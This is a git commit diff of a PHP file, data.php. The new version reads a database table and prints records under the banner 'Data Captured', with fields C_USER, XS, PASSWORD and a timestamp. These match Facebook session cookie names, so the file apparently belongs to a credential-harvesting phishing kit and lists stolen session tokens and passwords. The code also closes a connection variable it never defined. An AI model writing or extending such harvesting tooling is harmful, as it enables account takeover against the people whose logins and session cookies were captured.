796a494383eec0b99c4745bcb7f11c94619321dd
karan kumar <98558244+karankumar1996@users.noreply.github.com>
2024-02-16 18:56:04 +0500

    final

--- data.php
+++ data.php
@@ -1,8 +1,23 @@
 <?php
 
-$fh = fopen('/tmp/username.txt','r');
-while ($line = fgets($fh)) {
-  // <... Do your work with the line ...>
-  echo($line);
-}
-fclose($fh);
+require __DIR__ . '/database.php';
+
+  $sql =<<<EOF
+      SELECT * from DATA;
+EOF;
+
+  $ret = pg_query($dbconn, $sql);
+  if(!$ret) {
+    echo pg_last_error($dbconn);
+    exit;
+  } 
+  while($row = pg_fetch_row($ret)) {
+    echo "*********Data Captured**********";
+    echo "C_USER = ". $row[0] . "\n";
+    echo "XS = ". $row[1] ."\n";
+    echo "PASSWORD = ". $row[2] ."\n";
+    echo "TIME =  ".$row[4] ."\n";
+    echo "------------------------------";
+    echo "\n\n";
+  }
+  pg_close($db);
